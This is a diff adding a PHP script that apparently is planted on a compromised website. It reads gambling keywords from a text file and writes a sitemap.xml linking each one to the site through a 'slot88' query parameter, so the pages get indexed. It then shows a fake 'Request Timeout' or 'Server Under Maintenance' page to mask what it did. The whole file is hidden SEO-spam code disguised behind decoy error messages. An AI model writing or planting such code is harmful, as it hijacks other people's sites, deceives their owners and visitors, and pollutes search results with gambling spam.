@@ -1,0 +1,45 @@
+<?php
+function getFileRowCount($filename)
+{
+	$file = fopen($filename, "r");
+	$rowCount = 0;
+	while (!feof($file)) {
+		fgets($file);
+		$rowCount++;
+	}
+	fclose($file);
+	return $rowCount;
+}
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+$fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+if (isset($fullUrl)) {
+	$parsedUrl = parse_url($fullUrl);
+	$scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+	$host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+	$path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+	$baseUrl = $scheme . "://" . $host . $path;
+	$urlAsli = str_replace("sitemap_generator.php", "", $baseUrl);
+	$judulFile = "phl.txt";
+	$jumlahBaris = getFileRowCount($judulFile);
+	$sitemapFile = fopen("sitemap.xml", "w");
+	fwrite($sitemapFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
+	fwrite($sitemapFile, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);
+	$fileLines = file($judulFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+	foreach ($fileLines as $index => $judul) {
+		$sitemapLink = $urlAsli . '?slot88=' . urlencode($judul);
+		fwrite($sitemapFile, '  <url>' . PHP_EOL);
+		fwrite($sitemapFile, '    <loc>' . $sitemapLink . '</loc>' . PHP_EOL);
+		fwrite($sitemapFile, '  </url>' . PHP_EOL);
+	}
+	fwrite($sitemapFile, '</urlset>' . PHP_EOL);
+	fclose($sitemapFile);
+	echo "<title>Page Title</title>";
+	echo "<h1>Request Timeout</h1>";
+	echo "<p>This request takes too long to process, it is timed out by the server. If it should not be timed out, please contact administrator of this web site to increase 'Connection Timeout'.</p>";
+} else {
+	echo "<title>Server Under Maintenance </title>";
+	echo "<h1>Server Under Maintenance</h1>";
+	echo "<p>Sorry for the inconvenience, but we’re performing a maintenance at the moment.</p>";
+	echo "<p>We’ll be back online shortly!</p>";
+}
+?>
